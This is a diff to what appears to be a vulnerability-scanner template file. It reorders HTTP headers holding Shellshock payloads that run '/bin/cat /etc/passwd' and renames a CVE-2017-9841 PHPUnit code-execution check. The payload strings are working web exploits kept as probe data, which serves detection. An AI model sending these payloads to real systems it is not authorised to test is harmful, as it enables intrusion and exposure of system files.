@@ -3214,9 +3214,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -5414,7 +5414,7 @@
     {
       "id": "CVE-2017-9841",
       "info": {
-        "name": "CVE-2017-9841",
+        "name": "PHPUnit < 4.8.28 and 5.x - 5.63 Arbitrary Code Execution",
         "severity": "critical"
       },
       "requests": [
